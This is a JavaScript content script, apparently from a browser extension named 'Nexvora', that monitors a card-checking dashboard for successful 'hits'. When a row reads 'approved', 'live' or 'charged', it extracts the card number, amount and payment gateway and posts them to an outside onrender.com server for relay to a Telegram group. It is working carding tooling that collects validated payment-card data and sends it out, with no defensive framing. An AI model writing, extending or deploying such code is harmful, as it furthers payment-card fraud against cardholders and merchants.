/**
 * Nexvora Notification System
 * Monitors the dashboard for successful hits and notifies the Telegram group.
 */

(function() {
    const RENDER_URL = 'https://extensionshitteer.onrender.com';
    let userChatId = 'Unknown';

    // Get User Chat ID from storage
    chrome.storage.local.get(['chatId'], (result) => {
        if (result.chatId) {
            userChatId = result.chatId;
        }
    });

    const notifyServer = async (hitData) => {
        try {
            const response = await fetch(`${RENDER_URL}/api/notify-hit`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    card: hitData.card,
                    amount: hitData.amount,
                    gateway: hitData.gateway,
                    status: hitData.status,
                    user_chat_id: userChatId
                })
            });
            const data = await response.json();
            console.log('Notification Status:', data);
        } catch (error) {
            console.error('Failed to send notification:', error);
        }
    };

    const processNewRow = (row) => {
        // Obfuscated rows might have dynamic classes, so we look for text patterns
        const text = row.innerText || '';
        const lowerText = text.toLowerCase();
        
        console.log('Nexvora Check:', lowerText);

        // Check if this hit matches any success keyword
        const successKeywords = ['approved', 'success', 'live', 'authorized', 'charged'];
        const isSuccess = successKeywords.some(kw => lowerText.includes(kw));

        if (isSuccess) {
            console.info('🚀 Nexvora: Successful hit detected in UI!', text);
            
            // Extract data
            const parts = text.split('\n').map(p => p.trim()).filter(p => !!p);
            
            const hitData = {
                card: parts.find(p => /^\d{4,}/.test(p)) || 'N/A',
                amount: parts.find(p => p.includes('$') || /^\d+\.\d{2}/.test(p)) || 'N/A',
                gateway: parts.find(p => ['stripe', 'square', 'braintree', 'paypal'].includes(p.toLowerCase())) || 'Stripe',
                status: 'Approved'
            };

            notifyServer(hitData);
        }
    };

    const setupObserver = () => {
        const containers = [
            'recentHitsWrap',
            'hitsWrap'
        ].map(id => document.getElementById(id)).filter(el => !!el);

        if (containers.length === 0) {
            console.warn('Nexvora: Hit containers not found. Retrying in 2 seconds...');
            setTimeout(setupObserver, 2000);
            return;
        }

        containers.forEach(container => {
            const observer = new MutationObserver((mutations) => {
                mutations.forEach((mutation) => {
                    mutation.addedNodes.forEach((node) => {
                        if (node.nodeType === 1) { 
                            processNewRow(node);
                        }
                    });
                });
            });

            observer.observe(container, { childList: true, subtree: true });
            console.log(`✅ Nexvora: Monitoring ${container.id} for successful hits...`);
        });
    };

    console.log('🔥 Nexvora Notification System initialized.');
    setupObserver();
})();
